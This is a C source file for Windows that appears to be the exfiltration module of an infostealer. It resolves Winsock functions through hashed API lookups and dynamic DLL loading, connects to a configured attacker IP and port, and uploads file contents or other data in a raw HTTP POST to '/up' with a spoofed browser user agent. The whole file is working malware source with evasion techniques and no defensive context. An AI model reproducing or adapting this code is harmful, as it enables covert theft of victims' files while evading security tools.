#include "../include/StringUtils.h"
#include "../include/SendData.h"
#include "../include/MemoryUtils.h"
#include "../include/FileIO.h"
#include "../include/PathOps.h"
#include "../include/ntdll.h"
#include "../include/DllOps.h"
#include "../include/AddrResolution.h"
#include "../include/macros.h"
#include "../include/syscalls.h"

#include <winsock2.h>

int                 (__stdcall    *WSAStartupFunc)      (WORD, LPWSADATA);
unsigned long long  (__stdcall    *WSASocketFunc)       (int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD);
int                 (__stdcall    *WSAConnectFunc)      (SOCKET,const struct sockaddr*,int, LPWSABUF,LPWSABUF,LPQOS,LPQOS);
int                 (__stdcall    *SendFunc)            (SOCKET,const char FAR*,int, int);

void *SocketDll    = {0};
extern unsigned long long hSocket;

void InitSocket() {
/*     if (hSocket == 0) { */
        WSADATA     WSAStruct   = {0};
        SOCKADDR_IN SocketAddr  = {0};

        if (SocketDll == NULL) {
            SocketDll       = LoadDll(L"ws2_32.dll");
            WSAStartupFunc  = NULL;
            WSASocketFunc   = NULL;
            WSAConnectFunc  = NULL;
            SendFunc        = NULL;
        }

        if (WSAStartupFunc == NULL) {
            WSAStartupFunc      = GetFuncAddress(SocketDll, WSATART);
            WSASocketFunc       = GetFuncAddress(SocketDll, WSASOCK);
            WSAConnectFunc      = GetFuncAddress(SocketDll, WSACONN);
            SendFunc            = GetFuncAddress(SocketDll, SENDHASH);
        }

        if (hSocket == 0) {
            WSAStartupFunc(MAKEWORD(2, 2), &WSAStruct) == 0;
        }
        hSocket = WSASocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

        SocketAddr.sin_family       = AF_INET;
        SocketAddr.sin_port         = HOST_PORT;
        SocketAddr.sin_addr.s_addr  = HOST_IP;

        if (WSAConnectFunc(hSocket, (SOCKADDR*)&SocketAddr, sizeof(SocketAddr), NULL, NULL, NULL, NULL) != 0) {
            hSocket = -1;
        }
/*     } */
}


int SendData(HANDLE FileHandle, char *name, int DataSize, char *DataSizeAsString, unsigned char *buffer, unsigned char *data, int IsFile) {
    IO_STATUS_BLOCK IOstatus            = {0};
    LARGE_INTEGER   wait                = {0};
    int             CurrentBuffSize     = 0;
    int             FinalBufferSize     = 0;

    InitSocket();

    if (hSocket == -1) {
        return -1;
    }

    const char *RequestHeader =
            "POST /up HTTP/1.1\r\n"
            "Host: idk.com\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n"
            "Accept-Language: en-US,en;q=0.9,ar;q=0.8,fr;q=0.7\r\n"
            "Content-Type: application/octet-stream\r\n"
            "Connection: keep-alive\r\n"
            "Sec-Ch-Ua-Platform: Windows\r\n";

    const char *RequestNameField = "name: ";

    const char *RequestLengthField = "Content-Length: ";

    /*copy the const part of the request which is request head to the allocated buffer*/
    MovMemory(RequestHeader, buffer, len(RequestHeader));

    /*append the file name to the name field then append it to the buffer*/
    ConcatString(buffer, RequestNameField, len(buffer));
    ConcatString(buffer, name, len(buffer));
    ConcatString(buffer, "\r\n", len(buffer));

    /*append the file length to the length field then append it to the buffer*/
    ConcatString(buffer, RequestLengthField, len(buffer));
    ConcatString(buffer, DataSizeAsString, len(buffer));
    ConcatString(buffer, "\r\n\r\n", len(buffer));

    /*
    get the size of the buffer which contains only the http request
    so we can shift buffer pointer to the end
    so we can write the content of the file to the same buffer
    */
    CurrentBuffSize = len(buffer);
    /*shift the buffer pointer to the end of the buffer*/
    buffer += CurrentBuffSize;
    /*read the content of the file*/
    if (IsFile == TRUE) {
        ReadBuffer(FileHandle, &IOstatus, buffer, DataSize);
    } else {
        MovMemory(data, buffer, DataSize);
    }
    /*shift back the pointer to its original place*/
    buffer -= CurrentBuffSize;
    /*get the full size of the buffer with the file content*/
    FinalBufferSize = CurrentBuffSize + DataSize;

    /*send the buffer*/
    if (SendFunc(hSocket, buffer, FinalBufferSize, 0) == SOCKET_ERROR) {
        return -1;
    }

    /*wait for 1.5s*/
    wait.QuadPart = -1500 * 10000;
    NtWaitForSingleObject((HANDLE)-1, FALSE, &wait);

    FreeMemory(buffer);

    return 0;
}